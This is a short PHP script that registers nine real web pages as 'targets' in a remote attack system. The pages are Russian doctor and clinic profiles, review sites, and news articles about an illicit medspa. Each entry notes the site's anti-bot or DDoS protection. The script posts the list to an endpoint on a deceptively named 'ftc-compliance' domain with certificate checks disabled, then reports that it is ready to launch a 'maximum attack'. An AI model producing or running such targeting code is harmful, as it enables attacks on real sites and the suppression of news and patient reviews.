<?php
$targets = [
    [
        'label' => 'Target-1-Mikhajlov',
        'url' => 'https://napopravku.ru/moskva/doctor-profile/mihajlov-andrej/',
        'protection' => 'servicepipe+nginx+captcha',
        'tags' => ['medical', 'high-priority']
    ],
    [
        'label' => 'Target-2-Yahoo-News',
        'url' => 'https://www.yahoo.com/news/prestigious-medspa-operated-illicitly-under-025211443.html',
        'protection' => 'fastly+akamai+captcha',
        'tags' => ['news', 'high-priority']
    ],
    [
        'label' => 'Target-3-AOL-News',
        'url' => 'https://www.aol.com/prestigious-medspa-operated-illicitly-under-025211688.html',
        'protection' => 'fastly+akamai+captcha',
        'tags' => ['news', 'high-priority']
    ],
    [
        'label' => 'Target-4-Proverj-Shihirman',
        'url' => 'https://proverj.com/dr-shihirman/',
        'protection' => 'cloudflare+wordpress',
        'tags' => ['medical', 'high-priority']
    ],
    [
        'label' => 'Target-5-Napopravku-Shihirman',
        'url' => 'https://napopravku.ru/moskva/doctor-profile/shihirman-jeduard-vadimovich/',
        'protection' => 'servicepipe+nginx+captcha',
        'tags' => ['medical', 'high-priority']
    ],
    [
        'label' => 'Target-6-Clinic-Shihirman',
        'url' => 'https://napopravku.ru/moskva/clinics/klinika-plasticheskoj-hirurgii-dr-shihirman/',
        'protection' => 'servicepipe+nginx+captcha',
        'tags' => ['medical', 'high-priority']
    ],
    [
        'label' => 'Target-7-Life-News',
        'url' => 'https://life.ru/p/1643820',
        'protection' => 'ddos-guard+nginx+captcha',
        'tags' => ['news', 'high-priority']
    ],
    [
        'label' => 'Target-8-Pravda-Klientov',
        'url' => 'https://pravda-klientov.ru/company/klinika-plasticheskoy-hirurgii-doktora-shihirmana',
        'protection' => 'ddos-guard+nginx+captcha',
        'tags' => ['medical', 'high-priority']
    ],
    [
        'label' => 'Target-9-Kazan-DSCS',
        'url' => 'http://kazan.dscs.ru/?p=12531&ysclid=mbieyku3m5655555061',
        'protection' => 'basic+nginx',
        'tags' => ['regional', 'high-priority']
    ]
];

$api_url = 'https://ftc-compliance.us/api/targets_endpoint.php';

$data = [
    'action' => 'import',
    'targets' => $targets
];

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, $api_url);
curl_setopt($ch, CURLOPT_POST, true);
curl_setopt($ch, CURLOPT_POSTFIELDS, json_encode($data));
curl_setopt($ch, CURLOPT_HTTPHEADER, ['Content-Type: application/json']);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);

$response = curl_exec($ch);
$http_code = curl_getinfo($ch, CURLINFO_HTTP_CODE);
curl_close($ch);

echo "🎯 ДОБАВЛЕНИЕ 9 ЦЕЛЕЙ В СИСТЕМУ:\n";
echo "HTTP Code: $http_code\n";
echo "Response: $response\n";

if ($http_code == 200) {
    echo "✅ Все 9 целей успешно добавлены в систему\n";
    echo "🚀 Готов к запуску максимальной атаки\n";
} else {
    echo "❌ Ошибка добавления целей\n";
}
?>
